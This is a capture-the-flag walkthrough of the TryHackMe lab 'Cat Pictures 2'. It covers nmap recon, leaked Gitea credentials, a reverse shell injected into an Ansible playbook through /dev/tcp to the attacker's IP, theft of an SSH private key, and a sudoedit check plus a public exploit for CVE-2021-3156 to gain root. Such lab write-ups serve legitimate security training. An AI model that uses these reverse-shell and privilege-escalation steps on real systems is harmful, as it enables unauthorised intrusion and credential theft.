---
title: "THM | Cat Pictures 2 | Easy"
date: 22023-07-18T16:21:35+01:00
draft: false
cover:
    image: "img/catpictures2/Cat_Pictures_2.png"
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "Cat Pictures 2"
    caption: "Cat Pictures 2"
    #relative: false # To use relative path for cover image, used in hugo Page-bundles
tags: ["THM","Easy","Linux","Ansible","Playbooks","CVE-2021-3156"]
categories: ["Web"]
weight: 3 
---

### This post is a walkthrough of the Try Hack Me room [Cat Pictures 2](https://tryhackme.com/room/catpictures2){style="text-align: center;"}

---

## Intro{style="text-align: center;"}

---

### NMAP Scan

```sh
# Nmap 7.94 scan initiated Sat Jul  1 07:46:54 2023 as: nmap -sVC -T4 -vv -p- -oA nmap/all-tcp 10.10.23.83
Nmap scan report for 10.10.23.83
Host is up, received echo-reply ttl 63 (0.035s latency).
Scanned at 2023-07-01 07:46:55 IST for 102s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWn7oP+xezi54hhxJR3FAOcCt9gU+ZfOXquxFX/NC6USigzwXcxw2B4P3Yz6Huhaox1WRRgOSAYPJp9uo1gnA+ttkVdRaIqmcizbsznuU6sXntwiunD/QDNegq5UwJI3PjQu05HhnTNwGlBuiv+V/HW2OZGo0LLMY8ixqphCtAbw5uQZsV28rB2Yy1C7FYjkRzfhGePOfyq8Ga4FSpRnWz1vHYyEzFiF9tyLXNcDEdIWalKA6hrr7msEneSITE/RrGt5tynn6Rq5/3Os0mdbV0ztvqavwcWRR6B1UAJ+zPR/GKJ6s4Zr8ImoAXIZc7lFQ7Oh8DVWYp4cearg90RZUx
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhoBFkSKYS/dRjYASX26cs3gtgKxnLhhnXBas1fJ5i32J7h9+X8XA3GHT2SzP8/CBbs759W5q68jDA9nsTYnzo=
|   256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMiQc+7IBNNbs8nZJ4L+ntHTLbWn0Xn5b+QnWuboKE6r
80/tcp   open  http    syn-ack ttl 62 nginx 1.4.6 (Ubuntu)
|_http-server-header: nginx/1.4.6 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-favicon: Unknown favicon MD5: 60D8216C0FDE4723DCA5FBD03AD44CB7
| http-methods: 
|_  Supported Methods: GET HEAD
| http-git: 
|   10.10.23.83:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-title: Lychee
222/tcp  open  ssh     syn-ack ttl 62 OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey: 
|   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB+PtL9v5aeL5ZyAqgRnysYUVe0Ww60OwRp1w4zMWjWtAlcYbgHraHSSi5OhIhiiN1qXxWRDmgkHBteWs7nKZRI=
|   256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHrtEihpl8XdvZJ4zLSvhdBlIeOBcRLyo7P6d7wOECm8
1337/tcp open  waste?  syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 3858
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 01 Jul 2023 06:47:14 GMT
|     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>OliveTin</title>
|     <link rel = "stylesheet" type = "text/css" href = "style.css" />
|     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
|     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
|     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
|     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
|     </head>
|     <body>
|     <main title = "main content">
|     <fieldset id = "section-switcher" title = "Sections">
|     <button id = "showActions">Actions</button>
|_    <button id = "showLogs">Logs</but
3000/tcp open  ppp?    syn-ack ttl 62
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=31ce202f5c0c68f7; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=W9fXHPzyvbR4O9POmUgVtbgT81o6MTY4ODE5NDAzNDY2NjI2OTMxOQ; Path=/; Expires=Sun, 02 Jul 2023 06:47:14 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 01 Jul 2023 06:47:14 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=dbfef6400c53f152; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=-ojc99I42U75nr_xxJyOTqyqNeg6MTY4ODE5NDAzOTc5NjQyNDYxMg; Path=/; Expires=Sun, 02 Jul 2023 06:47:19 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 01 Jul 2023 06:47:19 GMT
|_    Content-Length: 0
8080/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
| http-methods: 
|_  Supported Methods: GET HEAD
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1337-TCP:V=7.94%I=7%D=7/1%Time=649FCBF2%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nDate:\x20Sat,\x2001\x20Jul\x202023\x2006:47:14\x20GMT\r\
SF:nLast-Modified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n
SF:<!DOCTYPE\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<tit
SF:le>OliveTin</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x2
SF:0=\x20\"text/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20r
SF:el\x20=\x20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x
SF:20=\x20\"OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-
SF:touch-icon\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/
SF:>\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x
SF:20href=\"OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"ap
SF:ple-touch-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png
SF:\"\x20/>\n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20c
SF:ontent\">\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\
SF:x20=\x20\"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Ac
SF:tions</button>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but")%
SF:r(HTTPOptions,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\
SF:nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nDate:\x20Sat,\x2001\x20Jul\x202023\x2006:47:14\x20GMT\r\nLast-Modi
SF:fied:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n<!DOCTYPE\
SF:x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\"\x20conte
SF:nt=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<title>OliveTi
SF:n</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x20=\x20\"te
SF:xt/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20rel\x20=\x2
SF:0\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x20=\x20\"O
SF:liveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon
SF:\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/>\n\t\t<li
SF:nk\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x20href=\"O
SF:liveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"apple-touch-
SF:icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png\"\x20/>\n
SF:\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20content\">\
SF:n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\x20=\x20\"
SF:Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Actions</but
SF:ton>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94%I=7%D=7/1%Time=649FCBF2%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,2DE8,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset=
SF:UTF-8\r\nSet-Cookie:\x20i_like_gitea=31ce202f5c0c68f7;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=W9fXHPzyvbR4O9POmUgVtbg
SF:T81o6MTY4ODE5NDAzNDY2NjI2OTMxOQ;\x20Path=/;\x20Expires=Sun,\x2002\x20Ju
SF:l\x202023\x2006:47:14\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSite
SF:=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2001\x20Jul\x2
SF:02023\x2006:47:14\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-
SF:US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</t
SF:itle>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;base
SF:64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUi
SF:OiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2x
SF:vY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOpt
SF:ions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Control
SF::\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=dbfef6400
SF:c53f152;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csr
SF:f=-ojc99I42U75nr_xxJyOTqyqNeg6MTY4ODE5NDAzOTc5NjQyNDYxMg;\x20Path=/;\x2
SF:0Expires=Sun,\x2002\x20Jul\x202023\x2006:47:19\x20GMT;\x20HttpOnly;\x20
SF:SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate
SF::\x20Sat,\x2001\x20Jul\x202023\x2006:47:19\x20GMT\r\nContent-Length:\x2
SF:00\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  1 07:48:37 2023 -- 1 IP address (1 host up) scanned in 103.33 seconds
```

### Ports Of Interest

```text
Discovered open port 8080/tcp on 10.10.23.83
Discovered open port 22/tcp on 10.10.23.83
Discovered open port 80/tcp on 10.10.23.83
Discovered open port 1337/tcp on 10.10.23.83
Discovered open port 3000/tcp on 10.10.23.83
Discovered open port 222/tcp on 10.10.23.83
```

### Port 80 (HTTP)

Browse to the main webpage and begin to begin or analysis of the site. I first checked for the presence of a 'robots.txt'. Nmap already flagged it's presence in the scan.

```text
80/tcp   open  http    syn-ack ttl 62 nginx 1.4.6 (Ubuntu)
|_http-server-header: nginx/1.4.6 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
```

![Robots Texts File](/img/catpictures2/robots.png "Contents of Robots.txt")

**Screenshot of main page on port 80.**

![Main Page](/img/catpictures2/mainpage.png "Main Home Page Contents")

Clicking the cat pictures brings us to a gallery of all the cat pictures. Clicking on a single picture brings up an about side menu that that has an information icon button that we can click. 

![About Picture](/img/catpictures2/about.png "About Information Button")

Looking at the description field, we see a note to self saying 'strip metadata'. Upon seeing this you should be thinking this is a note for us to view the metadata of the picture.  Download the picture to your box and use `exiftool` to read the contents of the metadata.

**Examine the metadata with exiftool**

![Metadata](/img/catpictures2/metadata.png "Read Metadata with Exiftool")

Under the metadata Title field we see `:8080/764efa883dda1e11db47671c4a3bbd9e.txt`, which when used with the IP address of the box gives a new link to view `http://<room ip>:8080/764efa883dda1e11db47671c4a3bbd9e.txt` Browse the to link we now have to see the 'note to self'

![Note Link](/img/catpictures2/notelink.png "Note To Self Link")

### Credentials Found

```text
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: <redacted to not ruin the box for others>

ansible runner (olivetin): port 1337
```

### Port 1337

The note to self references 'Olivetin' and if you Google what this is you find a one line description on the top of their webpage.

![OliveTin](/img/catpictures2/olivetin.png " OliveTin Description")

Okay, from the brief description we can surmise we should be able to run shell commands from this site running anisible runners possibly!

Browse to `http://<box ip>:1337` to take a look.

![OilveTin Page](/img/catpictures2/port1337.png " OliveTin on Port 1337")

The 'Ping Host' looked interesting, so I wanted to see if we could possibly inject code here.  I first tried pinging my kali box by entering my IP address and setting up tcpdump to listen for icmp packets.

![Ping Host](/img/catpictures2/pinghost.png "Pinging My Kali IP")

**Listening with tcpdump on my Kali box.**

```ssh
sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:49:28.764099 IP 10.10.23.83 > 10.11.0.200: ICMP echo request, id 2405, seq 1, length 64
08:49:28.764248 IP 10.11.0.200 > 10.10.23.83: ICMP echo reply, id 2405, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```
Pings do reach our kali box, but I was not able to exploit this and decided to carry on.

### Port 3000

Main Page for Port 3000 is running GitTea

![GitTea Main Page](/img/catpictures2/port3000.png "Main GitTea Home Page")

We can see link a login in the top right hand side of the that we can use with the credentials we found in the note earlier.

![GitTea Login](/img/catpictures2/gittea_login.png "Login for GitTea")

Once we login we can see git submits with references to flags. Take a look and see if we can find any flags.

![GitFlags](/img/catpictures2/flags_git.png "Git Flags")

The second git submit has a note saying "add flag", so lets take a look. As you can see we now have our first flag. I checked the other submissions but they they reveal any other flags.

### First Flag

![Flag 1](/img/catpictures2/flag1.png "First Flag Found")

If we click on the samarium/ansible repository you will find the flag1.txt along with a yaml playbook called 'playbook.yaml'.

![ansible Playbook](/img/catpictures2/playbook.png "Playbook Found")

Take a look at the contents of this playbook and you will see the username is Bismuth and under the Tasks a command that runs `whoami`. This is the Linux `whoami` and If we modify this we should be able to inject a reverse shell payload to call back to our Kali box. Let's give it a go!  Change the `whoami` to `bash -c 'exec bash -i &>dev/tcp/10.11.0.200/9001 <&1'` and submit the changes.

![Edit Playbook](/img/catpictures2/modified_playbook.png "Modified Playbook with Reverse Shell")

Start your listener on your Kali box to receive the call back from the playbook injected reverse shell.

![PWNCAT Listener](/img/catpictures2/pwncat.png "Pwncat Listener")

Next browse to http://10.10.186.186:1337/ and click 'Run Ansible Playbook' to start the playbook and our reverse shell.
![Run Ansible Playbook](/img/catpictures2/runansible.png "Run Ansible Playbook")

### Foothold

After running the Ansible Playbook you have received your reverse shell. 

**Reverse Shell Foothold**

![Rev Shell](/img/catpictures2/revshell.png "Reverse Shell Established")

Change directory to `/home/bismuth` and list the contents bismuth's home folder. Flag2.txt  can be seen in the home folder. Retrieve the flag and submit to Try Hack Me.

![Flag 2](/img/catpictures2/flag2.png " Flag 2 File Found")

Listing the contents off .ssh in the home folder we can see an **id_rsa** file that we should download and use for a more stable shell on the box.
![ID RSA](/img/catpictures2/idrsa.png "Download 'id_rsa' File for User Bismuth")

Now `chmod 600 id_rsa` and `ssh -i id_rsa bismuth@10.10.186.186` to establish a true shell with ssh. This gives us a more stable environment to work from.

![Bismuth SSH](/img/catpictures2/bismuthssh.png "SSH As Bismuth")

I tried the usual manual enumeration methods here but did not find anything, so I uploaded and ran LinPEAS.  LinPEAS discovered a few CVE's but one that looked promising was CVE-2021-3156. To test the box was vulnerable you can run the following command `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` and if you receive a 'malloc' error then the box is vulnerable.

![Check Vulnerability](/img/catpictures2/cve_test.png "Check if Vulnerable")

Searching Google we can find the following exploit https://github.com/CptGibbon/CVE-2021-3156.  Download exploit c code and upload to the box.  We need to upload the c files and compile on the target so it will match the dependencies (usually Libc) of the target box.

Host the source code for the exploit on your Kali box with python3 web server.

```sh
webup # my alias for python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.156.208 - - [02/Jul/2023 12:29:22] "GET /exploit.c HTTP/1.1" 200 -
10.10.156.208 - - [02/Jul/2023 12:29:35] "GET /shellcode.c HTTP/1.1" 200 -
10.10.156.208 - - [02/Jul/2023 12:29:42] "GET /Makefile HTTP/1.1" 200 -
```

### Compile Exploit For Privesc

After the files have been uploaded we can run the makefile to compile binary exploit. Now the exploit binary has been compiled, just run it to get root user access, grab the flag and submit it to Try Hack Me. As you can see in the image below we are now root and can retrieve flag3 located in the root users home folder.

![Compile Exploit](/img/catpictures2/compile_exploit.png "Compiling Exploit")

---

### Congratulations{style="text-align: center;"}
![Congrats](/img/catpictures2/congrats.png#center "Room Completed")

---













